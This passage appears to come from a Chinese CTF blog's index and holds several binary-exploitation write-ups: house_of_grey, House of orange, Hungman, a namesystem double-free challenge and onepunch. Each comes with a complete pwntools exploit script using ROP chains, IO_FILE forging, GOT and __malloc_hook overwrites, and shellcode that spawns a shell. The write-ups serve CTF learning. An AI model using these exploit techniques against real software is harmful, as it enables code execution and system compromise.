sh.sendlineafter(&#x27;2:puts&#x27;,&#x27;1&#x27;)  sh.sendlineafter(&#x27;size&#x27;,&#x27;1&#x27;)      sh.interactive()  \n","categories":["CTF"],"tags":["top chunk","house of force"]},{"title":"house_of_grey","url":"/2019/12/09/house_of_grey/","content":"首先，检查一下程序的保护机制,发现保护全开\n\n\n然后，我们用IDA分析一下\n\n\n发现是一个读取文件并显示的程序，除了flag文件，其他文件都可以读取\n\n\n程序有个缓冲区溢出漏洞\n\n\n可以**[溢出，修改v8指针，然后我们就可以利用功能4，实现任意地址写]{.mark}**\n\n\n由于可以读取除了flag之外的文件，那么我们可以读取&#x2F;proc&#x2F;self&#x2F;maps文件\nLinux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。&#x2F;proc&#x2F;self&#x2F;mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。\n同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。\n那么，我们先来测试一下\n\n\n我们得到了各个段的地址，由此，我们可以绕过PIE，以及利用&#x2F;proc&#x2F;self&#x2F;mem来读取任意地址的内容。\n为了确定本程序能否getshell，我们检测一下execve系统调用有没有被禁用\n\n\n发现execve被禁用，那么我们就不能用system这些来getshell，我们可以构造ROP，把flag文件读取到内存中，再输出来。\n然后，我们再看看程序\n\n\n程序最后有一个exit(0)，由此，覆盖fn函数的返回地址来构造ROP不可行，我们可以覆盖read函数的返回地址，也就是调用read任意写时，把自己的返回地址给覆盖了,这样ROP写入后就直接开始执行了。为了覆盖read的返回地址，我们就需要确定栈的地址。\n但是，由于程序是clone出来的，第三个参数指定了clone出的进程的栈地址，程序一开始用mmap映射了一段内存，然后取了其中的一个随机的位置传给了clone，由此，我们不知道程序的栈地址。但是，我们可以通过读取&#x2F;proc&#x2F;self&#x2F;mem文件，来[搜索标记，已确定程序的栈地址。]{.mark}\n\n\n\n\n而**[标记就是”&#x2F;proc&#x2F;self&#x2F;maps”字符串，因为buf里保存了这个字符串，当我们在内存中搜索到这个字符串时，当前位置就是buf的栈地址，由此，我们就可以计算出其他的栈地址。]{.mark}**\n那么，我们先来获取一些需要的地址信息\nenterRoom()  setPath(&#x27;/proc/self/maps&#x27;)  readSomething(2000)  sh.recvuntil(&#x27;You get something:\\n&#x27;)  #解析程序的加载地址，以及mmap内存出的地址  elf_base = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16)  pop_rdi = elf_base + pop_s_rdi  pop_rsi = elf_base + pop_s_rsi  open_addr = elf_base + open_s_plt  read_addr = elf_base + read_s_plt  puts_addr = elf_base + puts_s_plt    while True:     line = sh.recvline()     if &#x27;heap&#x27; in line:        #接下来这一行就是mmap出的内存的信息        line = sh.recvline()        mmap_start = int(line.split(&#x27;-&#x27;)[0],16)        mmap_end = int(line.split(&#x27;-&#x27;)[1].split(&#x27; &#x27;)[0],16)        break  \n\n接下来，我们就需要读取&#x2F;proc&#x2F;self&#x2F;mem来搜索内存，确定栈地址了\n\n\n程序只能执行30次功能调用，之前已经用了4次，最后我们还需要用2次，那么我们搜索就最多24次，\n\n\n而我们每次最多允许读取100000个字节的数据，由此，我们能搜索2400000个字节的内容，通过IDA调试，观察buf的栈地址，计算它与mmap_end的值的差值，做一个大致的范围,由于栈是从高往低增长的，因此，我们应该从mmap_end – x ~ mmap_end搜索，其中x是一个范围。\n那么，我们就开始搜索吧\n#现在解析出clone的那个程序的stack地址  stack_end = mmap_end  stack_start = mmap_start    #范围偏差  offset = 0xf800000  #区间范围begin_off~stack_end里搜索  begin_off = stack_end - offset - 24 * 100000  setPath(&#x27;/proc/self/mem&#x27;)  seekTo(begin_off)  print &#x27;begin-&gt;&#x27;,hex(begin_off),&#x27;to&#x27;,hex(stack_end)  #在内存的范围内搜索，如果找到了/proc/self/mem这个字符串，说明当前地址就是buf的栈地址  for i in range(0,24):     readSomething(100000)     content = sh.recvuntil(&#x27;1.Find &#x27;)[:-7]     if &#x27;/proc/self/mem&#x27; in content:        print &#x27;found!&#x27;        arr = content.split(&#x27;/proc/self/mem&#x27;)[0]        break  if i == 23:     print &#x27;未能成功确定v8的地址，请重试!&#x27;     exit(0)    #获得了v8的地址，可以将它里面的内容，实现任意地址写  v8_addr = begin_off + i * 100000 + len(arr) + 5  print &#x27;v8 addr=&#x27;,hex(v8_addr)  read_ret = v8_addr - 0x50  \n\n现在，得到了存放read的返回地址的栈地址，我们就可以写ROP了\n#覆盖v8指针内容为存放read返回地址的栈地址  payload = &#x27;/proc/self/mem&#x27;.ljust(24,&#x27;\\x00&#x27;) + p64(read_ret)  setPath(payload)  #接下来，我们可以写rop了(v8_addr-24+15处就是/home/ctf/flag字符串)  rop = p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(pop_rsi) + p64(0) + p64(0) + p64(open_addr)  #我们打开的文件，描述符为6  rop += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(read_ret + 15 * 8) + p64(0) + p64(read_addr)  rop += p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(puts_addr)  rop += &#x27;/home/ctf/flag\\x00&#x27;    giveSomething(rop)  \n\n然后，我们就得到了flag\n\n\n综上，我们的exp脚本如下\n#coding:utf8  from pwn import *    sh = process(&#x27;./pwnh35&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,37518)  elf = ELF(&#x27;./pwnh35&#x27;)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  open_s_plt = elf.plt[&#x27;open&#x27;]  read_s_plt = elf.plt[&#x27;read&#x27;]  puts_s_plt = elf.plt[&#x27;puts&#x27;]  #pop rdi  #pop r15  #retn  pop_s_rsi = 0x1821  #pop rdi  #retn  pop_s_rdi = 0x1823    def enterRoom():     sh.sendlineafter(&#x27;Do you want to help me build my room? Y/n?\\n&#x27;,&#x27;Y&#x27;)    def setPath(content):     sh.sendlineafter(&#x27;5.Exit\\n&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;So man, what are you finding?\\n&#x27;,content)    def seekTo(pos):     sh.sendlineafter(&#x27;5.Exit\\n&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;So, Where are you?\\n&#x27;,str(pos))    def readSomething(length):     sh.sendlineafter(&#x27;5.Exit\\n&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;How many things do you want to get?\\n&#x27;,str(length))    def giveSomething(content):     sh.sendlineafter(&#x27;5.Exit\\n&#x27;,&#x27;4&#x27;)     sh.sendlineafter(&#x27;content:&#x27;,content)    enterRoom()  setPath(&#x27;/proc/self/maps&#x27;)  readSomething(2000)  sh.recvuntil(&#x27;You get something:\\n&#x27;)  #解析程序的加载地址，以及mmap内存出的地址  elf_base = int(sh.recvuntil(&#x27;-&#x27;).split(&#x27;-&#x27;)[0],16)  pop_rdi = elf_base + pop_s_rdi  pop_rsi = elf_base + pop_s_rsi  open_addr = elf_base + open_s_plt  read_addr = elf_base + read_s_plt  puts_addr = elf_base + puts_s_plt    while True:     line = sh.recvline()     if &#x27;heap&#x27; in line:        #接下来这一行就是mmap出的内存的信息        line = sh.recvline()        mmap_start = int(line.split(&#x27;-&#x27;)[0],16)        mmap_end = int(line.split(&#x27;-&#x27;)[1].split(&#x27; &#x27;)[0],16)        break    #现在解析出clone的那个程序的stack地址  stack_end = mmap_end  stack_start = mmap_start    #范围偏差  offset = 0xf800000  #区间范围begin_off~stack_end里搜索  begin_off = stack_end - offset - 24 * 100000  setPath(&#x27;/proc/self/mem&#x27;)  seekTo(begin_off)  print &#x27;begin-&gt;&#x27;,hex(begin_off),&#x27;to&#x27;,hex(stack_end)  #在内存的范围内搜索，如果找到了/proc/self/mem这个字符串，说明当前地址就是buf的栈地址  for i in range(0,24):     readSomething(100000)     content = sh.recvuntil(&#x27;1.Find &#x27;)[:-7]     if &#x27;/proc/self/mem&#x27; in content:        print &#x27;found!&#x27;        arr = content.split(&#x27;/proc/self/mem&#x27;)[0]        break  if i == 23:     print &#x27;未能成功确定v8的地址，请重试!&#x27;     exit(0)    #获得了v8的地址，可以将它里面的内容，实现任意地址写  v8_addr = begin_off + i * 100000 + len(arr) + 5  print &#x27;v8 addr=&#x27;,hex(v8_addr)  read_ret = v8_addr - 0x50  #覆盖v8指针内容为存放read返回地址的栈地址  payload = &#x27;/proc/self/mem&#x27;.ljust(24,&#x27;\\x00&#x27;) + p64(read_ret)  setPath(payload)  #接下来，我们可以写rop了(v8_addr-24+15处就是/home/ctf/flag字符串)  rop = p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(pop_rsi) + p64(0) + p64(0) + p64(open_addr)  #我们打开的文件，描述符为6  rop += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(read_ret + 15 * 8) + p64(0) + p64(read_addr)  rop += p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(puts_addr)  rop += &#x27;/home/ctf/flag\\x00&#x27;    giveSomething(rop)    sh.interactive()  \n\n本题，我对maps和mem文件有了进一步的了解，其中maps文件里有程序的加载地址信息，mem是程序的内存映射。\n","categories":["CTF"],"tags":["栈溢出","内存搜索"]},{"title":"House of orange","url":"/2020/02/14/houseoforange/","content":"House of orange因一道同名的题而来，它是在程序没有调用free函数的情况下利用其它漏洞结合IO_FILE来达到利用。\n\n首先利用漏洞修改top chunk的size，然后申请一个比size大的堆，满足一定条件，这个top chunk就会被释放到unsorted bin里。\n\n利用unsorted bin attack，将__IO_list_all指针改写为unsorted bin的头chunk地址\n\n利用漏洞在可控的unsorted bin里伪造IO_file_plus和vtable结构\n\n再次malloc时，由于unsorted bin里的指针被修改了,发生malloc_printerr报错，而malloc_printerr用到了__IO_list_all指针，会从__IO_list_all指向的地方开始查找合适的FILE结构，并调用里面vtable里的函数。因此，我们在vtable里放入system函数即可getshell\n\n\n我们先来看一下程序的保护机制\n\n\n然后，我们用IDA分析一下，一次create创建3个堆，总共可以create三次。\n\n\nUpgrade操作存在明显的堆溢出漏洞\n\n\nshow功能没有什么异常\n\n\n做堆题，一般都是要先泄露libc地址，这需要用到unsorted bin，但是本题没有free操作。我们可以**[利用溢出，修改top chunk的size，改小一点。]{.mark}然后我们malloc一个比这个size大的chunk，由于我们申请的大小超过了top chunk的大小。系统会使用sysmalloc来分配堆，sysmalloc最后会判断old_size如果符合条件[，原来的top chunk就会被释放，即放入unsorted bin。]{.mark}**\nstatic void *  sysmalloc (INTERNAL_SIZE_T nb, mstate av)  &#123;    mchunkptr old_top;              /* incoming value of av-&gt;top */    INTERNAL_SIZE_T old_size;       /* its size */  /*      If have mmap, and the request size meets the mmap threshold, and      the system supports mmap, and there are few enough currently      allocated mmapped regions, try to directly map this request      rather than expanding top.    */      if (av == NULL        || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))      &#123;  .........  /* Setup fencepost and free the old top chunk with a multiple of              MALLOC_ALIGNMENT in size. */            /* The fencepost takes at least MINSIZE bytes, because it might              become the top chunk again later.  Note that a footer is set              up, too, although the chunk is marked in use. */            old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;            set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);            if (old_size &gt;= MINSIZE)              &#123;                set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);                set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));                set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);                _int_free (av, old_top, 1);              &#125;            else              &#123;                set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);                set_foot (old_top, (old_size + 2 * SIZE_SZ));              &#125;  &#125;  .....  &#125;  \n\n当unsorted bin里有chunk后，我们通过申请堆块，就能让指针保留在我们的申请的堆里，这样我们就能泄露了。当然为了能把heap的地址也泄露出来，我们malloc一个large bin，这样它的fd_nextsize和bk_nextsize中指向自身。\nbuild(0x30,&#x27;a&#x27;*0x30)  #修改top chunk的size为0xF80  payload = &#x27;a&#x27;*0x30 + p64(0) + p64(0x21) + &#x27;b&#x27;*0x10 + p64(0) + p64(0xF80)  edit(len(payload),payload)  #申请一个比top chunk的size大的空间，那么top chunk会被放入unsorted bin  build(0x1000,&#x27;b&#x27;)  #接下来申请unsorted bin里的chunk，泄露libc地址和堆地址  build(0x400,&#x27;c&#x27;)  show()  sh.recvuntil(&#x27;Name of house : &#x27;)  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  _IO_list_all_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (_IO_list_all_s &amp; 0xFFF)  libc_base = _IO_list_all_addr - _IO_list_all_s  system_addr = libc_base + system_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;_IO_list_all_addr=&#x27;,hex(_IO_list_all_addr)  #泄露堆地址  edit(0x10,&#x27;c&#x27;*0x10)  show()  sh.recvuntil(&#x27;c&#x27;*0x10)  heap_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  heap_base = heap_addr - 0xE0  print &#x27;heap_base=&#x27;,hex(heap_base)  \n\n接下来，我们利用unsorted bin attack修改__IO_list_all指针\nUnsorted bin attack的原理在glibc的源码中，我们伪造将__IO_list_all-0x10伪造成bk，这样bck-&gt;fd &#x3D; __IO_list_all &#x3D; unsorted_chunks (av) &#x3D; main_arena + 0x58\n/* remove from unsorted list */  unsorted_chunks (av)-&gt;bk = bck;  bck-&gt;fd = unsorted_chunks (av);  \n\n此时, main_arena + 0x58相当于一个IO_file_plus结构，但是main_arena+0x58的内容我们不能完全控制，也就不能在这里伪造结构。\n我们看到IO_file_plus结构有一个_chain指针，它位于IO_file_plus+0x68处，指向了下一个IO_file_plus结构体，相当于单链表一样，用指针连接起来。现在main_arena+0x58是IO_file_plus，那么_chain的位置就在main_arena+0x58 + 0x68 &#x3D; main_arena + 0xC0，而main_arena + 0xC0存储着的是small bin的头地址。所以，[我们要让main_arena + 0xC0指向一个我们可控的地方，然后在那里伪造第二个IO_file_plus结构，即通过转移，让它转移到我们可控的地方。]{.mark}\n\n\n[我们可以把unsorted bin的头结点的size改成0x60，这样]{.mark}当我们调用malloc，glibc会整理unsorted bin，把对应size的chunk放入对应的bin里面。此时，size为0x60，属于small_bin\nstatic void *  _int_malloc (mstate av, size_t bytes)  &#123;  /* remove from unsorted list */            unsorted_chunks (av)-&gt;bk = bck;            bck-&gt;fd = unsorted_chunks (av);              /* Take now instead of binning if exact fit */              if (size == nb)              &#123;                set_inuse_bit_at_offset (victim, size);                if (av != &amp;main_arena)                  victim-&gt;size |= NON_MAIN_ARENA;                check_malloced_chunk (av, victim, nb);                void *p = chunk2mem (victim);                alloc_perturb (p, bytes);                return p;              &#125;              /* place chunk in bin */              if (in_smallbin_range (size))              &#123;                victim_index = smallbin_index (size);  //victim_index=6              bck = bin_at (av, victim_index);  //bck=&amp;av-&gt;bins[10]-0x10              fwd = bck-&gt;fd;  //fwd=&amp;av-&gt;bins[10]            &#125;  ...  mark_bin (av, victim_index);  victim-&gt;bk = bck;  victim-&gt;fd = fwd;  fwd-&gt;bk = victim;//&amp;av-&gt;bins[10]+0x18 = old_top  bck-&gt;fd = victim; &#125;  \n\nmain_arena结构\nstruct malloc_state  &#123;    /* Serialize access.  */    mutex_t mutex;      /* Flags (formerly in max_fast).  */    int flags;      /* Fastbins */    mfastbinptr fastbinsY[NFASTBINS];      /* Base of the topmost chunk -- not otherwise kept in a bin */    mchunkptr top;      /* The remainder from the most recent split of a small request */    mchunkptr last_remainder;      /* Normal bins packed as described above */    mchunkptr bins[NBINS * 2 - 2];      /* Bitmap of bins */    unsigned int binmap[BINMAPSIZE];      /* Linked list */    struct malloc_state *next;      /* Linked list for free arenas.  Access to this field is serialized      by free_list_lock in arena.c.  */    struct malloc_state *next_free;      /* Number of threads attached to this arena.  0 if the arena is on      the free list.  Access to this field is serialized by      free_list_lock in arena.c.  */    INTERNAL_SIZE_T attached_threads;      /* Memory allocated from the system in this arena.  */    INTERNAL_SIZE_T system_mem;    INTERNAL_SIZE_T max_system_mem;  &#125;;  \n\nav-&gt;bins[10]+0x18 &#x3D; main_arena + 0x58 + 0x8*10 + 0x18 &#x3D; main_arena + 0xC0 &#x3D; old_top\n我们让unsorted bin的size为0x60，是为了让chain指针正好重新指回来，指向我们可控的地方。\n那么，我们就可以开始伪造结构体了，我们还需要绕过一下检查\n_IO_flush_all_lockp (int do_lock)  &#123;    int result = 0;    FILE *fp;  #ifdef _IO_MTSAFE_IO    _IO_cleanup_region_start_noarg (flush_cleanup);    _IO_lock_lock (list_all_lock);  #endif    for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)      &#123;        run_fp = fp;        if (do_lock)          _IO_flockfile (fp);        if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)             || (_IO_vtable_offset (fp) == 0                 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                                      &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*我们需要构造满足条件*/             )            &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*从_IO_list_all指向的FILE结构开始查找，找到合适_IO_FILE作为_IO_OVERFLOW的参数，执行vtable里面的函数，把IO_FILE结构体本身作为参数*/          result = EOF;        if (do_lock)          _IO_funlockfile (fp);        run_fp = NULL;      &#125;  #ifdef _IO_MTSAFE_IO    _IO_lock_unlock (list_all_lock);    _IO_cleanup_region_end (0);  #endif    return result;  &#125;  \n\n我们伪造的结构体如下\n#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = &#x27;/bin/sh\\x00&#x27; + p64(0x60) #size作为0x60，被放入small_bin，从而对应了chain指针  #unsorted bin attack，修改_IO_list_all为main_arena+88  fake_file += p64(0) + p64(_IO_list_all_addr-0x10)  #_IO_write_base &lt; _IO_write_ptr  fake_file += p64(0) + p64(1)  fake_file = fake_file.ljust(0xC0,&#x27;\\x00&#x27;)  fake_file += p64(0)*3  #vtable指针,同时，也作为fake_vtable的__dummy  fake_file += p64(heap_base + 0x5E8)  #__dummy2、__finish  fake_file += p64(0)*2  #__overflow  fake_file += p64(system_addr)  \n\n现在，让我们来malloc触发后看看\n\n\n\n\n\n\n\n\n同时，我们也已经getshell\n\n\n[如果getsehll失败，可以多试几次就会成功。因为栈环境问题。]{.mark}\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./houseoforange&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,44076)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  #libc = ELF(&#x27;./libc64-2.19.so&#x27;)    _IO_list_all_s = libc.symbols[&#x27;_IO_list_all&#x27;]  system_s = libc.sym[&#x27;system&#x27;]      def build(size,name):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Length of name :&#x27;,str(size))     sh.sendafter(&#x27;Name :&#x27;,name)     sh.sendlineafter(&#x27;Price of Orange:&#x27;,&#x27;123&#x27;)     sh.sendlineafter(&#x27;Color of Orange:&#x27;,&#x27;1&#x27;)    def show():     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)    def edit(size,name):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;Length of name :&#x27;,str(size))     sh.sendafter(&#x27;Name:&#x27;,name)     sh.sendlineafter(&#x27;Price of Orange:&#x27;,&#x27;123&#x27;)     sh.sendlineafter(&#x27;Color of Orange:&#x27;,&#x27;1&#x27;)    build(0x30,&#x27;a&#x27;*0x30)  #修改top chunk的size为0xF80  payload = &#x27;a&#x27;*0x30 + p64(0) + p64(0x21) + &#x27;b&#x27;*0x10 + p64(0) + p64(0xF80)  edit(len(payload),payload)  #申请一个比top chunk的size大的空间，那么top chunk会被放入unsorted bin  build(0x1000,&#x27;b&#x27;)  #接下来申请unsorted bin里的chunk，泄露libc地址和堆地址  build(0x400,&#x27;c&#x27;)  show()  sh.recvuntil(&#x27;Name of house : &#x27;)  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  _IO_list_all_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (_IO_list_all_s &amp; 0xFFF)  libc_base = _IO_list_all_addr - _IO_list_all_s  system_addr = libc_base + system_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;_IO_list_all_addr=&#x27;,hex(_IO_list_all_addr)  #泄露堆地址  edit(0x10,&#x27;c&#x27;*0x10)  show()  sh.recvuntil(&#x27;c&#x27;*0x10)  heap_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  heap_base = heap_addr - 0xE0  print &#x27;heap_base=&#x27;,hex(heap_base)    payload = &#x27;a&#x27;*0x400  payload += p64(0) + p64(0x21) + &#x27;a&#x27;*0x10  #执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = &#x27;/bin/sh\\x00&#x27; + p64(0x60) #size作为0x60，被放入small_bin，从而对应了chain指针  #unsorted bin attack，修改_IO_list_all为main_arena+88  fake_file += p64(0) + p64(_IO_list_all_addr-0x10)  #_IO_write_base &lt; _IO_write_ptr  fake_file += p64(0) + p64(1)  fake_file = fake_file.ljust(0xC0,&#x27;\\x00&#x27;)  fake_file += p64(0)*3  #vtable指针,同时，也作为fake_vtable的__dummy  fake_file += p64(heap_base + 0x5E8)  #__dummy2、__finish  fake_file += p64(0)*2  #__overflow  fake_file += p64(system_addr)    payload += fake_file  edit(len(payload),payload)  #malloc触发异常，getshell  sh.recv()  sh.sendline(&#x27;1&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["unsorted bin","house of orange","small bin","IO FILE"]},{"title":"Hungman","url":"/2020/02/09/hungman/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n最开始输入名字，根据名字长度申请堆\n\n\n当我们打赢游戏，更改名字时，可以出现溢出\n\n\n[之前的堆依然还是那个，而我们的输入的内容可以变得更长，导致溢出到下一个堆块，而下一个堆块正式游戏数据的结构体]{.mark}，我们就可以篡改，改成函数的got表地址，再次打赢游戏，就能泄露信息，同理，再来一次，修改got表\n而这个游戏是一个猜字母的游戏，并且是这样记分数的\n\n\n要猜的字母个数等于我们输入的用户名长度\n\n\n我们如果输入长度大于26的名字，然后从a到z猜，就一定可约获胜\n我们完整的exp脚本\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./hungman&#x27;)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,48979)  elf = ELF(&#x27;./hungman&#x27;)  strchr_got = elf.got[&#x27;strchr&#x27;]  system_s = libc.sym[&#x27;system&#x27;]  strchr_s = 0x89AB0    def winGame():     for x in string.ascii_lowercase:        ans = sh.recv()        if &#x27;High score! change name?&#x27; in ans:           break        if &#x27;Continue?&#x27; in ans:           sh.sendline(&#x27;y&#x27;)        #print ans        sh.sendline(x)        sleep(0.2)    sh.sendlineafter(&quot;What&#x27;s your name?&quot;,&quot;a&quot;*0x30)  winGame()      sh.sendline(&#x27;y&#x27;)  sleep(0.5)  payload = &#x27;b&#x27;*0x30  #溢出到结构体的内存位置处  payload += p64(0) + p64(0x91)  #score   name_len  payload += p32(0x100) + p32(0x100)  #name buf  payload += p64(strchr_got)    sh.sendline(payload)  sh.recvuntil(&#x27;Highest player: &#x27;)  strchr_addr = u64(sh.recvuntil(&#x27; score:&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  libc_base = strchr_addr - strchr_s  system_addr = libc_base + system_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)    sh.sendlineafter(&#x27;Continue?&#x27;,&#x27;y&#x27;)  winGame()  sh.sendlineafter(&#x27;High score! change name?&#x27;,&#x27;y&#x27;)  sleep(0.2)  sh.send(p64(system_addr))    sh.sendlineafter(&#x27;Continue?&#x27;,&#x27;y&#x27;)  winGame()  sh.sendline(&#x27;y&#x27;)  sleep(0.5)  sh.sendline(&#x27;/bin/sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["堆溢出"]},{"title":"huxiangbei_2019_namesystem","url":"/2020/04/30/huxiangbei_2019_namesystem/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n在delete功能里，如果当v1为18的时候，19处的指针就不会被覆盖，此后18和19指向的是同一个堆，因此存在double free漏洞。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./huxiangbei_2019_namesystem&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29866)elf = ELF(&#x27;./huxiangbei_2019_namesystem&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]def add(size,content):   sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Name Size:&#x27;,str(size))   sh.sendafter(&#x27;Name:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;The id you want to delete:&#x27;,str(index))for i in range(17):   add(0x20,&#x27;a&#x27;*0x20)#17add(0x50,&#x27;b&#x27;*0x50)#18add(0x60,&#x27;a&#x27;*0x60)#19add(0x50,&#x27;c&#x27;*0x50)#got表上伪造一个chunkfake_chunk_addr = 0x0000000000601FFAdelete(18)#19位置的指针移到18后没有清零，可以对19 double freedelete(19) #19delete(17) #17delete(17) #19add(0x60,&#x27;a&#x27;*0x60) #17add(0x60,&#x27;b&#x27;*0x60) #18add(0x60,&#x27;c&#x27;*0x60) #19#构造另一个double freedelete(18)delete(19)delete(17)delete(17)#腾出空间for i in range(17,-1,-1):   delete(i)#将got表伪chunk链接到fastbinadd(0x50,p64(fake_chunk_addr) + &#x27;\\n&#x27;) #0add(0x50,&#x27;b&#x27;*0x50) #1add(0x50,&#x27;c&#x27;*0x50) #2#修改free的got表为printf_pltadd(0x50,&#x27;a&#x27;*0xE + p64(printf_plt)[0:6] + &#x27;\\n&#x27;) #3#格式化字符串泄露地址add(0x20,&#x27;%13$p\\n&#x27;) #4delete(4)libc_base = int(sh.recvuntil(&#x27;Done!&#x27;,drop = True),16) - 0xF0 - libc.sym[&#x27;__libc_start_main&#x27;]malloc_hook_addr = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget_addr = libc_base + 0x4526arealloc_addr = libc_base + libc.sym[&#x27;realloc&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)add(0x60,p64(malloc_hook_addr - 0x23) + &#x27;\\n&#x27;) #4add(0x60,&#x27;b&#x27;*0x60) #5add(0x60,&#x27;c&#x27;*0x60) #6#写malloc_hookadd(0x60,&#x27;\\x00&#x27;*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x10) + &#x27;\\n&#x27;)#getshellsh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)sh.sendlineafter(&#x27;Name Size:&#x27;,&#x27;50&#x27;)sh.interactive()","categories":["CTF"],"tags":["UAF","fastbin"]},{"title":"text段有时是可以修改的","url":"/2020/04/30/inndy_onepunch/","content":"用IDA分析一下程序，任意地址写一个字节。\n\n\n想不到的是，text段可以修改，因此，我们可以直接修改text的指令，来达到多次利用。\n#coding:utf8#想不到text段竟然可以写from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./onepunch&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29567)text = 0x400767def writeData(addr,data):   sh.sendlineafter(&#x27;Where What?&#x27;,hex(addr) + &#x27; &#x27; + str(data))#通过一字节读写，我们修改text里的跳转writeData(text+1,u32(asm(&#x27;jnz $-0x4A&#x27;)[1:].ljust(4,&#x27;\\x00&#x27;)))#修改jnz指令为jmpwriteData(text,u32(asm(&#x27;jmp $-0x4A&#x27;)[0:1].ljust(4,&#x27;\\x00&#x27;)))shellcode = asm(&#x27;&#x27;&#x27;mov rax,0x0068732f6e69622f                   push rax                   mov rdi,rsp                   mov rax,59                   xor rsi,rsi                   mov rdx,rdx                   syscall                &#x27;&#x27;&#x27;)shellcode_addr = 0x0000000000400769i = 0for x in shellcode:   data = u8(x)   writeData(shellcode_addr + i,data)   i = i + 1#跳转到shellcodewriteData(text+1,u32(asm(&#x27;jnz $+0x2&#x27;)[1:].ljust(4,&#x27;\\x00&#x27;)))sh.interactive()\n\n由此，查阅资料知道了，修改text段可写，可以利用工具objcopy 